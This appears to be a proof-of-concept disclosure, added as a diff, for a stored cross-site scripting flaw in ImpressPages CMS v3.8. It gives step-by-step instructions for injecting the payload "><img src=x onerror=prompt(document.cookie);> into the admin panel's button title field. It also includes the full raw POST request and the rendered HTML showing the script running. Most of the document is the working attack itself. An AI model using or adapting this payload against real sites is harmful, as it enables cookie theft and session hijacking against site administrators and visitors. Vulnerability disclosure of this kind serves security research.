@@ -1,0 +1,61 @@
+###########################################################
+[~] Exploit Title:stored vulnerability
+[~] Author: sajith
+[~] version: ImpressPages CMS v3.8
+[~] vulnerable app link:http://www.impresspages.org/download/
+###########################################################
+
+
+steps:
+
+1) log into the admin panel
+http://127.0.0.1/cms/ImpressPages/?cms_action=manage
+
+2)click on advanced tab >> in the button title field enter the payload
+"><img src=x onerror=prompt(document.cookie);>
+
+
+request:
+
+POST /cms/ImpressPages/?cms_action=manage HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101
+Firefox/14.0.1
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://127.0.0.1/cms/ImpressPages/?cms_action=manage
+Content-Length: 538
+Cookie: ses11565=2v920trpg7sl8aghg3aj297su5
+Pragma: no-cache
+Cache-Control: no-cache
+
+g=standard&m=content_management&a=savePageOptions&securityToken=4496a2385a44fe257b857f04a3240f53&pageOptions%5BbuttonTitle%5D=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(document.cookie)%3B%3E+&pageOptions%5Bvisible%5D=1&pageOptions%5BcreatedOn%5D=2009-08-08&pageOptions%5BlastModified%5D=2012-01-21&pageOptions%5BpageTitle%5D=Home&pageOptions%5Bkeywords%5D=&pageOptions%5Bdescription%5D=&pageOptions%5Burl%5D=home&pageOptions%5Btype%5D=default&pageOptions%5BredirectURL%5D=&pageOptions%5Brss%5D=0&pageOptions%5Blayout%5D=home.php&revisionId=91
+
+
+3) refresh the page and we can see that the payload gets executed.
+
+
+
+
+</head>
+<body class="manage" >
+
+<div class="theme clearfix">
+    <header class="clearfix col_12">
+        <div class="logo ipModuleInlineManagement ipmLogo "
+ data-cssclass=''>
+    <a href="http://127.0.0.1/cms/ImpressPages/en/?cms_action=manage"
+style=" ">
+        xyz.com    </a>
+</div>
+
+        <div class="right">
+            <span class="currentPage">"><img src=x
+onerror=prompt(document.cookie);> </span>
+            <a href="#" class="topmenuToggle"> </a>
+            <div class="topmenu">
+                        <ul class="level1">
